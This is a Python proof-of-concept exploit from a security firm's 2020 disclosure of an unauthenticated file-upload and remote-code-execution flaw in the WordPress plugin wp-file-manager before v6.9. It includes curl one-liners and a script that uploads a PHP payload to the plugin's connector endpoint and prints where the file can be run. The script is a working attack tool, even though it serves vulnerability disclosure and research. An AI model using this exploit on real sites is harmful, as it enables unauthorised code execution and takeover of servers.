#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""PoC for arbitrary file upload + remote code execution (wp-file-manager
<v6.9)

WordPress plugin wp-file-manager versions before v6.9 have unauthenticated
arbitrary file upload and remote code execution vulnerability. This allows
attacker to upload and execute PHP code on the target server.

Seravo notified plugin author, and fixed version (v6.9) was published within
hours.



Usage:

If you have target site with vulnerable plugin, this should be enough to
exploit:

    apt-get install python3-requests
    echo '<?php echo "Hello World!"; ?>' > payload.php
    python3 2020-wp-file-manager-v67.py https://yoursite.example.com/

Alternative is to use plain cURL binary:

    curl -k -F cmd=upload -F target=l1_ -F debug=1 \
            -F 'upload[]=@payload3.php' \
            -X POST https://YOURSITE/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
    curl -kiLsS https://YOURSITE/wp-content/plugins/wp-file-manager/lib/files/payload3.php

Tested with

    1784efa2e31026c4441ced9066d7348d6199f3cb9ed8a3f168c5c9cd4c1059ac  wp-file-manager.zip



Source: <https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py.txt>
Blog post: <https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/>
Date: 2020-09-01
Contact: <mailto:security@seravo.com>

Related: <https://wpvulndb.com/vulnerabilities/10389>
Plugin: <https://wordpress.org/plugins/wp-file-manager/>
CVSS: 9.5 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C)
CWE: <https://cwe.mitre.org/data/definitions/434.html>

(c) 2020 Ville Korhonen <ville@xd.fi>
(c) 2020 Seravo Oy <https://seravo.com>
"""

import argparse
import sys

import requests  # python-requests, eg. apt-get install python3-requests


def exploit(url):
    full_url = f'{url}/wp-content/plugins/wp-file-manager/lib/php/' + \
               'connector.minimal.php'

    # Entry point is lib/php/connector.minimal.php, which then loads
    # elFinderConnector from file `lib/php/elFinderConnector.class.php`,
    # which then processes our input
    #
    data = {
        'cmd': 'upload',
        'target': 'l1_',
        'debug': 1,
    }
    files = {
        'upload[0]': open('payload.php', 'rb'),
    }

    print(f"Just do it... URL: {full_url}")
    res = requests.post(full_url, data=data, files=files, verify=False)
    print(res.status_code)
    if res.status_code == requests.codes.ok:
        print("Success!?")
        d = res.json()
        p = d.get('added', [])[0].get('url')
        print(f'{url}{p}')
    else:
        print("fail")
        return 1
    return 0


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('url', help="Full URL to the WordPress site " +
                                    "with vulnerable plugin")
    args = parser.parse_args()

    if not args.url.startswith('http'):
        raise ValueError(f"Invalid URL: {args.url}")

    return exploit(args.url)


if __name__ == '__main__':
    sys.exit(main())
